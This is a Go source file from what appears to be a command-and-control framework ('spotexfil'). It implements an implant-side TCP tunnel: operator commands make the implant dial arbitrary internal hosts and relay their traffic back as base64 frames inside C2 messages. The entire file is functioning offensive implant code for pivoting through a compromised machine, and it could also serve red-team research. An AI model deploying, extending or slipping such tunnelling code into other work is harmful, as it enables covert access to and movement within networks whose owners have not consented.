package c2

import (
	"encoding/base64"
	"encoding/json"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
)

// Tunnel frame operations. Frames travel as C2 messages with
// Module="tunnel": operator->implant frames ride in the command Args
// map, implant->operator frames are JSON-encoded in the result Data
// string.
const (
	TunnelOpOpen     = "open"
	TunnelOpData     = "data"
	TunnelOpClose    = "close"
	TunnelOpOpenOK   = "open-ok"
	TunnelOpOpenFail = "open-fail"
)

const (
	// tunnelMaxConns caps concurrent tunnel connections per implant.
	tunnelMaxConns = 32
	// tunnelReadChunk is the max payload bytes per data frame.
	tunnelReadChunk = 400
	// tunnelDialTimeout bounds the implant's connect to the target.
	tunnelDialTimeout = 10 * time.Second
	// tunnelResultSeqBase offsets implant-originated tunnel result
	// seqs far above operator-issued command seqs so result chunks
	// never collide with command results during reassembly.
	tunnelResultSeqBase = 900000
)

// Frame is a single tunnel protocol message. Seq is a per-connection
// sequence number; each direction has its own counter starting at 0
// for the first data frame (open/close frames are not sequenced).
type Frame struct {
	Conn int    `json:"conn"`
	Op   string `json:"op"`
	Addr string `json:"addr,omitempty"` // "host:port", open only
	Seq  int    `json:"seq"`
	Data string `json:"data,omitempty"` // base64 payload (data) or error string (open-fail)
}

// Marshal encodes the frame as JSON for the result Data string
// (implant -> operator direction).
func (f Frame) Marshal() string {
	b, _ := json.Marshal(f)
	return string(b)
}

// UnmarshalFrame decodes a JSON frame from a result Data string.
func UnmarshalFrame(s string) (Frame, error) {
	var f Frame
	err := json.Unmarshal([]byte(s), &f)
	return f, err
}

// toArgs encodes the frame as a command Args map
// (operator -> implant direction).
func (f Frame) toArgs() map[string]interface{} {
	args := map[string]interface{}{
		"conn": f.Conn,
		"op":   f.Op,
		"seq":  f.Seq,
	}
	if f.Addr != "" {
		args["addr"] = f.Addr
	}
	if f.Data != "" {
		args["data"] = f.Data
	}
	return args
}

// frameFromArgs decodes a frame from a command Args map. Numbers may
// arrive as float64 (JSON), int, or json.Number.
func frameFromArgs(args map[string]interface{}) Frame {
	return Frame{
		Conn: argInt(args, "conn"),
		Op:   argString(args, "op"),
		Addr: argString(args, "addr"),
		Seq:  argInt(args, "seq"),
		Data: argString(args, "data"),
	}
}

// FrameFromResult extracts a tunnel Frame from a PollResults result
// map. Returns ok=false if the result is not a valid tunnel frame.
// The orchestrator uses this to feed module=="tunnel" results into
// Operator.TunnelFrameCh.
func FrameFromResult(result map[string]interface{}) (Frame, bool) {
	mod, _ := result["module"].(string)
	if mod != "tunnel" {
		return Frame{}, false
	}
	data, _ := result["data"].(string)
	f, err := UnmarshalFrame(data)
	if err != nil {
		return Frame{}, false
	}
	return f, true
}

// NewDataFrame builds a data frame with a base64-encoded payload.
func NewDataFrame(conn, seq int, payload []byte) Frame {
	return Frame{
		Conn: conn,
		Op:   TunnelOpData,
		Seq:  seq,
		Data: base64.StdEncoding.EncodeToString(payload),
	}
}

// Payload decodes the base64 payload of a data frame.
func (f Frame) Payload() ([]byte, error) {
	return base64.StdEncoding.DecodeString(f.Data)
}

func argString(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func argInt(m map[string]interface{}, key string) int {
	if v, ok := m[key]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		case json.Number:
			i, _ := n.Int64()
			return int(i)
		}
	}
	return 0
}

// --- Implant side ---

// implantTunnelConn is one dialed connection on the implant.
type implantTunnelConn struct {
	conn    net.Conn
	writeMu sync.Mutex // serializes writes + recv seq tracking
	recvSeq int        // next expected data frame seq from the operator
}

// tunnelManager tracks an implant's open tunnel connections.
type tunnelManager struct {
	mu    sync.Mutex
	conns map[int]*implantTunnelConn
}

// Implant structs cannot gain fields without editing implant.go, so
// tunnel managers live in a package-level registry keyed by implant.
var (
	implantTunnelsMu sync.Mutex
	implantTunnels         = make(map[*Implant]*tunnelManager)
	tunnelResultSeq  int64 = tunnelResultSeqBase
)

func (imp *Implant) getTunnelManager() *tunnelManager {
	implantTunnelsMu.Lock()
	defer implantTunnelsMu.Unlock()
	tm, ok := implantTunnels[imp]
	if !ok {
		tm = &tunnelManager{conns: make(map[int]*implantTunnelConn)}
		implantTunnels[imp] = tm
	}
	return tm
}

// nextTunnelResultSeq returns a unique seq for implant-originated
// tunnel results (offset far above operator command seqs).
func nextTunnelResultSeq() int {
	return int(atomic.AddInt64(&tunnelResultSeq, 1))
}

// sendTunnelFrame queues a tunnel frame as a C2 result.
func (imp *Implant) sendTunnelFrame(f Frame, status string) {
	if status == "" {
		status = "ok"
	}
	result := protocol.NewC2Message("tunnel", nextTunnelResultSeq())
	result.Status = status
	result.Data = f.Marshal()
	result.SessionID = imp.sessionID
	imp.resultCh <- result
}

// handleTunnelFrame processes a module=="tunnel" command from the
// operator. The orchestrator dispatches these here (like keyexchange).
func (imp *Implant) handleTunnelFrame(msg *protocol.C2Message) {
	f := frameFromArgs(msg.Args)
	tm := imp.getTunnelManager()
	switch f.Op {
	case TunnelOpOpen:
		tm.handleOpen(imp, f)
	case TunnelOpData:
		tm.handleData(f)
	case TunnelOpClose:
		tm.closeConn(f.Conn)
	}
}

// handleOpen dials the requested target and, on success, spawns a
// reader goroutine streaming data frames back to the operator.
func (tm *tunnelManager) handleOpen(imp *Implant, f Frame) {
	fail := func(reason string) {
		imp.sendTunnelFrame(Frame{Conn: f.Conn, Op: TunnelOpOpenFail, Data: reason}, "error")
	}

	tm.mu.Lock()
	if len(tm.conns) >= tunnelMaxConns {
		tm.mu.Unlock()
		fail("too many concurrent tunnels")
		return
	}
	if _, exists := tm.conns[f.Conn]; exists {
		tm.mu.Unlock()
		fail("connection id already in use")
		return
	}
	tm.mu.Unlock()

	conn, err := net.DialTimeout("tcp", f.Addr, tunnelDialTimeout)
	if err != nil {
		fail(err.Error())
		return
	}

	// Re-check under lock: concurrent opens may have raced the dial.
	tm.mu.Lock()
	if len(tm.conns) >= tunnelMaxConns {
		tm.mu.Unlock()
		conn.Close()
		fail("too many concurrent tunnels")
		return
	}
	if _, exists := tm.conns[f.Conn]; exists {
		tm.mu.Unlock()
		conn.Close()
		fail("connection id already in use")
		return
	}
	tc := &implantTunnelConn{conn: conn}
	tm.conns[f.Conn] = tc
	tm.mu.Unlock()

	imp.sendTunnelFrame(Frame{Conn: f.Conn, Op: TunnelOpOpenOK}, "ok")
	go tm.readerLoop(imp, f.Conn, tc)
}

// readerLoop streams target->implant data as sequenced data frames,
// then a close frame on EOF/error.
func (tm *tunnelManager) readerLoop(imp *Implant, id int, tc *implantTunnelConn) {
	buf := make([]byte, tunnelReadChunk)
	seq := 0
	for {
		n, err := tc.conn.Read(buf)
		if n > 0 {
			imp.sendTunnelFrame(NewDataFrame(id, seq, buf[:n]), "ok")
			seq++
		}
		if err != nil {
			imp.sendTunnelFrame(Frame{Conn: id, Op: TunnelOpClose}, "ok")
			tm.closeConn(id)
			return
		}
	}
}

// handleData writes an operator payload to the target connection.
// Frames arrive via sequential C2 messages; recvSeq drops stale or
// duplicate frames.
func (tm *tunnelManager) handleData(f Frame) {
	tm.mu.Lock()
	tc, ok := tm.conns[f.Conn]
	tm.mu.Unlock()
	if !ok {
		return
	}
	payload, err := f.Payload()
	if err != nil {
		return
	}
	tc.writeMu.Lock()
	defer tc.writeMu.Unlock()
	if f.Seq < tc.recvSeq {
		return // stale/duplicate
	}
	tc.recvSeq = f.Seq + 1
	_ = writeFull(tc.conn, payload)
}

// closeConn closes and forgets a tunnel connection.
func (tm *tunnelManager) closeConn(id int) {
	tm.mu.Lock()
	tc, ok := tm.conns[id]
	if ok {
		delete(tm.conns, id)
	}
	tm.mu.Unlock()
	if ok {
		tc.conn.Close()
	}
}

// connCount reports the number of open tunnel connections (tests).
func (tm *tunnelManager) connCount() int {
	tm.mu.Lock()
	defer tm.mu.Unlock()
	return len(tm.conns)
}

// writeFull writes all of p, handling partial writes.
func writeFull(w interface{ Write([]byte) (int, error) }, p []byte) error {
	for len(p) > 0 {
		n, err := w.Write(p)
		if err != nil {
			return err
		}
		p = p[n:]
	}
	return nil
}
